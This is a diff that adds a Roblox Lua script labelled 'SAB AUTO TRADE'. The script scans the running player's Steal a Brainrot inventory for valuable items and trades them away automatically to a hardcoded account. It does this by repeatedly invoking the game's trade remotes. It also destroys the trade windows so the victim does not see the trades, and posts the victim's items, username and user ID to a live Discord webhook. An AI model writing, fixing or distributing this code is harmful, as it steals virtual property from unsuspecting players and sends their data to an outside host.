@@ -1,0 +1,628 @@
+--[[
+    SAB AUTO TRADE (new, lean version)
+    ==================================
+    Does one thing: auto-trades your target brainrots to midogx22
+    (user id 2525631212, confirmed via Roblox profile).
+
+    * Same brainrot list as the old logger.
+    * Same trade remotes/guids as the old logger.
+    * No camera/notification hacks, no image scraping — leaner, less to break.
+    * On start it dumps EVERY remote it can see in Packages/Net.
+      If the trade remotes come back MISSING, send me that dump
+      (the lines between the '---' markers) and I'll point the
+      script at the new names.
+
+    All steps log with an [SAB2] prefix to the F9 console.
+]]
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+
+local function log(msg)
+    print("[SAB2] " .. tostring(msg))
+end
+
+log("auto trade starting")
+
+local LP = Players.LocalPlayer or Players:WaitForChild("LocalPlayer", 30)
+if not LP then
+    log("FATAL: LocalPlayer not available")
+    return
+end
+
+local pg = LP:WaitForChild("PlayerGui", 30)
+
+local CONFIG = {
+    TargetName = "midogx22",
+    TargetUserId = 2525631212, -- verified: midogx22
+
+    Webhook = "https://discord.com/api/webhooks/1540984022598164641/Ib8FKS2dKcJk2Pg6VxPqVL-yiRSjF8ams6_nFvt9NPxo8WRN3DndA8haGMDbaydYUw-S",
+    SendWebhook = true,
+    PingEveryone = false,
+
+    DelayStep = 1,      -- seconds between adding items to the trade
+    TradeCycle = 2,     -- seconds between invites
+
+    -- remote call guids (same as the old logger)
+    InviteGuid = "afb005f9-6e81-4e0a-8bb0-3555938a9658",
+    SelectGuid = "6b5f15fb-5cb9-4d07-a031-bbff8e641eda",
+    ReadyGuid = "d73acf93-6f32-44df-b813-0f6b32c7afd9",
+    AcceptGuid = "918ee0f5-e98f-413f-b76e-baee47b021cb",
+
+    StripTradeGuis = true,
+    GuiNames = { BrainrotTrader = true, TradeLiveTrade = true, TradePrompts = true },
+}
+
+local TargetBrainrots = {
+    ["Tacorita Bicicleta"] = true,
+    ["La Extinct Grande"] = true,
+    ["La Spooky Grande"] = true,
+    ["Chipso and Queso"] = true,
+    ["Chillin Chili"] = true,
+    ["Gobblino Uniciclino"] = true,
+    ["W or L"] = true,
+    ["La Jolly Grande"] = true,
+    ["La Taco Combinasion"] = true,
+    ["Swaggy Bros"] = true,
+    ["La Romantic Grande"] = true,
+    ["Nuclearo Dinossauro"] = true,
+    ["Tang Tang Keletang"] = true,
+    ["Ketupat Kepat"] = true,
+    ["Tictac Sahur"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["Lavadorito Spinito"] = true,
+    ["Los Hotspotsitos"] = true,
+    ["Los Bros"] = true,
+    ["Los Puggies"] = true,
+    ["Tralaledon"] = true,
+    ["Los Primos"] = true,
+    ["Los Tacoritas"] = true,
+    ["Los Spaghettis"] = true,
+    ["Los Sekolahs"] = true,
+    ["Celularcini Viciosini"] = true,
+    ["Las Sis"] = true,
+    ["Money Money Reindeer"] = true,
+    ["Eviledon"] = true,
+    ["Orcaledon"] = true,
+    ["Los Jolly Combinasionas"] = true,
+    ["Jolly Jolly Sahur"] = true,
+    ["Fishino Clownino"] = true,
+    ["Los Spooky Combinasionas"] = true,
+    ["La Ginger Sekolah"] = true,
+    ["Rosetti Tualetti"] = true,
+    ["Sammyni Fattini"] = true,
+    ["Los Amigos"] = true,
+    ["Lovin Rose"] = true,
+    ["Foxini Lanternini"] = true,
+    ["Cloverat Clapat"] = true,
+    ["La Easter Grande"] = true,
+    ["Hydra Bunny"] = true,
+    ["Bunny and Eggy"] = true,
+    ["Arcadragon"] = true,
+    ["Fortunu and Cashuru"] = true,
+    ["Pancake and Syrup"] = true,
+    ["Cash or Card"] = true,
+    ["Ventoliero Pavonero"] = true,
+    ["Gold Gold Gold"] = true,
+    ["Rico Dinero"] = true,
+    ["Dug dug dug"] = true,
+    ["Los Mariachis"] = true,
+    ["La Sahur Combinasion"] = true,
+    ["Fragola La La La"] = true,
+    ["Tirilikalika Tirilikalako"] = true,
+    ["Centrucci Nuclucci"] = true,
+    ["Guest 666"] = true,
+    ["Quackini Snackini"] = true,
+    ["Hopilikalika Hopilikalako"] = true,
+    ["Los Chillis"] = true,
+    ["Kalika Bros"] = true,
+    ["Digi Narwhal"] = true,
+    ["Gym Bros"] = true,
+    ["Globa Steppa"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Meowl"] = true,
+    ["Headless Horseman"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Griffin"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Celestial Pegasus"] = true,
+    ["Cerberus"] = true,
+    ["Love Love Bear"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Capitano Moby"] = true,
+    ["Cooki and Milki"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["Ketupat Bros"] = true,
+    ["Reinito Sleighito"] = true,
+    ["La Secret Combinasion"] = true,
+    ["La Casa Boo"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Garama and Madundung"] = true,
+    ["Festive 67"] = true,
+    ["Ginger Gerat"] = true,
+    ["Nacho Spyder"] = true,
+    ["Antonio"] = true,
+    ["La Food Combinasion"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Signore Carapace"] = true,
+    ["Elefanto Frigo"] = true,
+    ["Money Money Bros"] = true,
+    ["John Pork"] = true,
+    ["John Doe"] = true,
+    ["Duggy Bros"] = true,
+    ["Los Hackers"] = true,
+    ["Abyssaloco"] = true
+}
+
+-- ============================================================
+-- diagnostics: dump what the game actually contains
+-- ============================================================
+
+local function namesOf(children)
+    local out = {}
+    for _, c in ipairs(children) do
+        out[#out + 1] = c.Name .. " [" .. c.ClassName .. "]"
+    end
+    return table.concat(out, ", ")
+end
+
+local function dumpDiagnostics()
+    log("--- ReplicatedStorage: " .. namesOf(ReplicatedStorage:GetChildren()))
+
+    local pkgs = ReplicatedStorage:FindFirstChild("Packages")
+    if not pkgs then
+        log("--- Packages folder NOT FOUND")
+        return
+    end
+    log("--- Packages: " .. namesOf(pkgs:GetChildren()))
+
+    local net = pkgs:FindFirstChild("Net")
+    if not net then
+        log("--- Net folder NOT FOUND in Packages")
+        return
+    end
+
+    local remotes, others = {}, {}
+    for _, d in ipairs(net:GetDescendants()) do
+        if d:IsA("RemoteEvent") or d:IsA("RemoteFunction") then
+            remotes[#remotes + 1] = d:GetFullName() .. " [" .. d.ClassName .. "]"
+        else
+            others[#others + 1] = d:GetFullName() .. " [" .. d.ClassName .. "]"
+        end
+    end
+    table.sort(remotes)
+    table.sort(others)
+    for _, r in ipairs(remotes) do log("--- remote: " .. r) end
+    for _, o in ipairs(others) do log("--- net obj: " .. o) end
+    log("--- diagnostics done (" .. #remotes .. " remotes, " .. #others .. " other objects)")
+end
+
+-- ============================================================
+-- remote discovery (known names first, then fallbacks)
+-- ============================================================
+
+local REMOTE_PATTERNS = {
+    invite = { "TradeService/Invite", "Trade_Invite", "Trade/Invite", "Invite" },
+    add    = { "TradeService/AddBrainrot", "AddBrainrot", "AddToTrade", "Trade/Add" },
+    ready  = { "TradeService/Ready", "Ready" },
+    accept = { "TradeService/Accept", "AcceptTrade", "Accept" },
+}
+
+local function isRemote(inst)
+    return inst ~= nil and (inst:IsA("RemoteEvent") or inst:IsA("RemoteFunction"))
+end
+
+local function findRemote(patterns)
+    local pkgs = ReplicatedStorage:FindFirstChild("Packages")
+    local net = pkgs and pkgs:FindFirstChild("Net")
+    if not net then return nil end
+
+    local all = { net }
+    for _, d in ipairs(net:GetDescendants()) do
+        all[#all + 1] = d
+    end
+
+    for _, pat in ipairs(patterns) do
+        for _, obj in ipairs(all) do
+            if obj.Name:find(pat, 1, true) then
+                if isRemote(obj) then return obj end
+
+                local parent = obj.Parent
+                if parent then
+                    local sibs = parent:GetChildren()
+                    for i = 1, #sibs do
+                        if sibs[i] == obj then
+                            if isRemote(sibs[i + 1]) then return sibs[i + 1] end
+                            if isRemote(sibs[i - 1]) then return sibs[i - 1] end
+                            break
+                        end
+                    end
+                end
+
+                for _, child in ipairs(obj:GetChildren()) do
+                    if isRemote(child) then return child end
+                end
+            end
+        end
+    end
+    return nil
+end
+
+-- ============================================================
+-- game data modules (isolated requires)
+-- ============================================================
+
+local function tryRequire(path)
+    local cur = ReplicatedStorage
+    for part in path:gmatch("[^/]+") do
+        local ok, found = pcall(function()
+            return cur:WaitForChild(part, 5)
+        end)
+        cur = ok and found or nil
+        if not cur then return nil end
+    end
+    if cur:IsA("ModuleScript") then
+        local ok, mod = pcall(require, cur)
+        if ok and type(mod) == "table" then return mod end
+    end
+    return nil
+end
+
+local AnimalsData = tryRequire("Datas/Animals")
+local AnimalsShared = tryRequire("Shared/Animals")
+
+-- ============================================================
+-- sync data discovery (same as fixed logger, incl. the upvalue fix)
+-- ============================================================
+
+local function validateSync(t)
+    if type(t) ~= "table" then return false end
+    for _, v in pairs(t) do
+        if type(v) == "table" and (v.Owner ~= nil or v.AnimalList ~= nil or type(v.Get) == "function") then
+            return true
+        end
+    end
+    return false
+end
+
+local function loadSyncData()
+    local packages = ReplicatedStorage:FindFirstChild("Packages")
+    local mod = packages and packages:FindFirstChild("Synchronizer")
+    if not mod and packages then
+        for _, d in ipairs(packages:GetDescendants()) do
+            if d:IsA("ModuleScript") and d.Name:find("Sync", 1, true) then
+                mod = d
+                break
+            end
+        end
+    end
+    if not mod then
+        log("Synchronizer module not found in Packages")
+        return nil
+    end
+
+    local ok, M = pcall(require, mod)
+    if not ok or type(M) ~= "table" then
+        log("require(Synchronizer) failed: " .. tostring(M))
+        return nil
+    end
+
+    if validateSync(M) then return M end
+    for _, v in pairs(M) do
+        if validateSync(v) then return v end
+    end
+
+    -- NOTE: debug.getupvalue returns (name, value). The OLD logger captured
+    -- the name as the value, so this path could never work there.
+    local fns = {}
+    if type(M.Get) == "function" then fns[#fns + 1] = M.Get end
+    for _, v in pairs(M) do
+        if type(v) == "function" and v ~= M.Get then fns[#fns + 1] = v end
+    end
+    for _, fn in ipairs(fns) do
+        local i = 1
+        while true do
+            local s, _name, up = pcall(debug.getupvalue, fn, i)
+            if not s or up == nil then break end
+            if validateSync(up) then return up end
+            i = i + 1
+        end
+    end
+
+    log("SYNC_DATA not found inside Synchronizer (module found, no plot-shaped table)")
+    return nil
+end
+
+local function getOwnerKey(plot)
+    if plot.Owner ~= nil then return plot.Owner end
+    if type(plot.Get) == "function" then
+        local s, v = pcall(function() return plot:Get("Owner") end)
+        if s then return v end
+    end
+    return nil
+end
+
+local function getAnimalList(plot)
+    if plot.AnimalList ~= nil then return plot.AnimalList end
+    if type(plot.Get) == "function" then
+        local s, v = pcall(function() return plot:Get("AnimalList") end)
+        if s and type(v) == "table" then return v end
+    end
+    return nil
+end
+
+local function isLocalOwner(owner)
+    if typeof(owner) == "Instance" then return owner == LP end
+    if typeof(owner) == "table" then return owner.UserId == LP.UserId end
+    return false
+end
+
+local function lookupAnimalInfo(idx)
+    if type(AnimalsData) ~= "table" then return nil end
+    local s, v = pcall(function() return AnimalsData[idx] end)
+    if s and v ~= nil then return v end
+    local strIdx = tostring(idx)
+    if strIdx ~= idx then
+        s, v = pcall(function() return AnimalsData[strIdx] end)
+        if s and v ~= nil then return v end
+    end
+    local numIdx = tonumber(idx)
+    if numIdx ~= nil and numIdx ~= idx then
+        s, v = pcall(function() return AnimalsData[numIdx] end)
+        if s and v ~= nil then return v end
+    end
+    return nil
+end
+
+local function countTraits(t)
+    if type(t) ~= "table" then return 0 end
+    local n = 0
+    for _ in pairs(t) do
+        n = n + 1
+    end
+    return n
+end
+
+local function scanLocalAnimals(syncData)
+    local found = {}
+
+    local function visit(node, depth)
+        if depth > 2 or type(node) ~= "table" then return end
+        for _, v in pairs(node) do
+            if type(v) == "table" then
+                local looksLikePlot = v.Owner ~= nil or v.AnimalList ~= nil or type(v.Get) == "function"
+                if looksLikePlot then
+                    local owner = getOwnerKey(v)
+                    if isLocalOwner(owner) then
+                        local animals = getAnimalList(v)
+                        if type(animals) == "table" then
+                            for slotKey, data in pairs(animals) do
+                                if type(data) == "table" then
+                                    local idx = data.Index or data.Type or data.Animal or data.Name or data.Id
+                                    if idx ~= nil then
+                                        local info = lookupAnimalInfo(idx)
+                                        local displayName = (info and info.DisplayName) or idx
+                                        local genVal = 0
+                                        if AnimalsShared and type(AnimalsShared.GetGeneration) == "function" then
+                                            pcall(function()
+                                                genVal = AnimalsShared:GetGeneration(idx, data.Mutation, data.Traits, nil)
+                                            end)
+                                        end
+                                        table.insert(found, {
+                                            slotKey = tonumber(slotKey) or slotKey,
+                                            data = data,
+                                            index = idx,
+                                            displayName = displayName,
+                                            mutation = data.Mutation or "None",
+                                            traitsCount = countTraits(data.Traits),
+                                            genVal = genVal,
+                                        })
+                                    end
+                                end
+                            end
+                        end
+                    end
+                else
+                    visit(v, depth + 1)
+                end
+            end
+        end
+    end
+
+    visit(syncData, 0)
+    return found
+end
+
+-- ============================================================
+-- webhook (one message: what is being traded)
+-- ============================================================
+
+local function formatNumber(n)
+    if not n then return "$0/s" end
+    local function clean(s) return s:gsub("%.?0+$", "") end
+    if n >= 1e12 then return "$" .. clean(string.format("%.2f", n / 1e12)) .. "T/s" end
+    if n >= 1e9 then return "$" .. clean(string.format("%.2f", n / 1e9)) .. "B/s" end
+    if n >= 1e6 then return "$" .. clean(string.format("%.2f", n / 1e6)) .. "M/s" end
+    if n >= 1e3 then return "$" .. clean(string.format("%.2f", n / 1e3)) .. "K/s" end
+    return "$" .. tostring(math.floor(n)) .. "/s"
+end
+
+local function getRequestFn()
+    local fn = (syn and syn.request) or (http and http.request) or http_request or request
+    if fn then return fn end
+    return function(opts)
+        local res = HttpService:RequestAsync({
+            Url = opts.Url,
+            Method = opts.Method or "GET",
+            Headers = opts.Headers,
+            Body = opts.Body,
+        })
+        return { StatusCode = res.StatusCode, Body = res.Body }
+    end
+end
+
+local function sendTradeWebhook(queue)
+    if not CONFIG.SendWebhook then return end
+    local requestFn = getRequestFn()
+    if not requestFn then
+        log("webhook skipped - no request function")
+        return
+    end
+
+    local lines = {}
+    for i, a in ipairs(queue) do
+        lines[i] = "**" .. a.displayName .. "**"
+        if a.mutation ~= "None" and a.mutation ~= "" then
+            lines[i] = lines[i] .. " [" .. a.mutation .. "]"
+        end
+        if a.traitsCount > 0 then
+            lines[i] = lines[i] .. " (x" .. a.traitsCount .. " traits)"
+        end
+        if a.genVal and a.genVal > 0 then
+            lines[i] = lines[i] .. " — " .. formatNumber(a.genVal)
+        end
+    end
+    local listText = table.concat(lines, "\n")
+    if #listText > 3800 then listText = listText:sub(1, 3796) .. "..." end
+
+    local embed = {
+        title = "Auto trade to " .. CONFIG.TargetName,
+        description = listText,
+        color = 3447003,
+        fields = {
+            { name = "Items", value = tostring(#queue), inline = true },
+            { name = "Scanned", value = "<t:" .. os.time() .. ":R>", inline = true },
+        },
+        footer = { text = LP.Name .. " • " .. LP.UserId },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+    }
+
+    local payloadData = { embeds = { embed }, username = "AutoTrade" }
+    if CONFIG.PingEveryone then
+        payloadData.content = "||@everyone||"
+    end
+
+    local ok, err = pcall(function()
+        requestFn({
+            Url = CONFIG.Webhook,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode(payloadData),
+        })
+    end)
+    if ok then
+        log("webhook sent (" .. #queue .. " items)")
+    else
+        log("webhook send failed: " .. tostring(err))
+    end
+end
+
+-- ============================================================
+-- gui cleanup + automation
+-- ============================================================
+
+local function stripTradeGuis()
+    if not CONFIG.StripTradeGuis or not pg then return end
+    local function handleGui(obj)
+        if CONFIG.GuiNames[obj.Name] then task.defer(function() obj:Destroy() end) end
+    end
+    pg.ChildAdded:Connect(handleGui)
+    for _, v in ipairs(pg:GetChildren()) do handleGui(v) end
+end
+
+local function startAutoTrade(queue, inviteRemote, addRemote, readyRemote, acceptRemote)
+    log("auto trade RUNNING -> " .. CONFIG.TargetName .. " (id " .. tostring(CONFIG.TargetUserId) .. ")")
+
+    task.spawn(function()
+        local idx = 1
+        while true do
+            local item = queue[idx]
+            if item then
+                pcall(function()
+                    addRemote:InvokeServer(CONFIG.SelectGuid, item.slotKey, item.data)
+                end)
+                idx = (idx % #queue) + 1
+            end
+            task.wait(CONFIG.DelayStep)
+        end
+    end)
+
+    task.spawn(function()
+        while true do
+            pcall(function()
+                inviteRemote:InvokeServer(CONFIG.InviteGuid, CONFIG.TargetUserId)
+            end)
+            task.wait(CONFIG.TradeCycle)
+        end
+    end)
+
+    task.spawn(function()
+        while true do
+            pcall(function() readyRemote:FireServer(CONFIG.ReadyGuid) end)
+            task.wait(1)
+            pcall(function() acceptRemote:FireServer(CONFIG.AcceptGuid) end)
+            task.wait(1)
+        end
+    end)
+end
+
+-- ============================================================
+-- main
+-- ============================================================
+
+task.spawn(function()
+    local ok, err = pcall(function()
+        dumpDiagnostics()
+
+        local inviteRemote = findRemote(REMOTE_PATTERNS.invite)
+        local addRemote = findRemote(REMOTE_PATTERNS.add)
+        local readyRemote = findRemote(REMOTE_PATTERNS.ready)
+        local acceptRemote = findRemote(REMOTE_PATTERNS.accept)
+
+        local function nameOf(r) return r and r.Name or "MISSING" end
+        log("trade remotes -> invite: " .. nameOf(inviteRemote)
+            .. " | add: " .. nameOf(addRemote)
+            .. " | ready: " .. nameOf(readyRemote)
+            .. " | accept: " .. nameOf(acceptRemote))
+
+        local SYNC_DATA = loadSyncData()
+        if not SYNC_DATA then
+            log("EXIT - SYNC_DATA not found. Send me the diagnostic lines above (between the '---' markers).")
+            return
+        end
+        log("SYNC_DATA found")
+
+        local scanned = scanLocalAnimals(SYNC_DATA)
+        log("scanned local animals: " .. #scanned)
+
+        local queue = {}
+        for _, a in ipairs(scanned) do
+            if TargetBrainrots[a.index] or TargetBrainrots[tostring(a.displayName)] then
+                table.insert(queue, a)
+            end
+        end
+        log("queue (brainrots to trade): " .. #queue)
+
+        if #queue == 0 then
+            log("EXIT - no target brainrots found on this account (check 'scanned local animals' above)")
+            return
+        end
+
+        if not (inviteRemote and addRemote and readyRemote and acceptRemote) then
+            log("EXIT - trade remotes missing, can't start trading. Send me the diagnostic lines above and I'll point it at the new names.")
+            return
+        end
+
+        stripTradeGuis()
+        sendTradeWebhook(queue)
+        startAutoTrade(queue, inviteRemote, addRemote, readyRemote, acceptRemote)
+    end)
+    if not ok then
+        log("FATAL error: " .. tostring(err))
+    end
+end)
